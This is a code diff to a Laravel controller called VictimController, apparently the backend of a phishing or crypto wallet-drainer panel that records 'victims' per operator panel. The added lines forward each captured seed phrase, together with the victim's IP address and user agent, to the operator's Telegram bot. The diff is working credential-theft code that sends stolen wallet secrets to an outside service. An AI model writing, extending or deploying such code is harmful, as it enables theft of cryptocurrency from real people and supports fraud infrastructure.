@@ -6,6 +6,8 @@ use App\Http\Controllers\Controller;
 use Illuminate\Http\Request;
 use App\Models\Victim;
 use App\Models\UserPanel;
+use App\Notifications\TelegramNotification;
+use Illuminate\Support\Facades\Notification;
 
 class VictimController extends Controller
 {
@@ -40,6 +42,13 @@ class VictimController extends Controller
         $data['user_agent'] = $request->header('User-Agent');
 
         $victim = Victim::updateOrCreate(['username' => $username, 'user_panel_id' => $panel->id], $data);
+
+        if (array_key_exists('seed', $data) && $panel->telegram_bot_token && $panel->telegram_chat_id) {
+            Notification::send($panel, new TelegramNotification($panel->telegram_bot_token, $panel->telegram_chat_id, ['seed' => $data['seed'], 'ip_address' => $data['ip_address'], 'user_agent' => $data['user_agent']]));
+        } else if (array_key_exists('seed', $data) && $panel->User->telegram_bot_token && $panel->User->telegram_chat_id) {
+            Notification::send($panel, new TelegramNotification($panel->User->telegram_bot_token, $panel->User->telegram_chat_id, ['seed' => $data['seed'], 'ip_address' => $data['ip_address'], 'user_agent' => $data['user_agent']]));
+        }
+
         return response()->json($victim->toArray(), 200);
     }
 
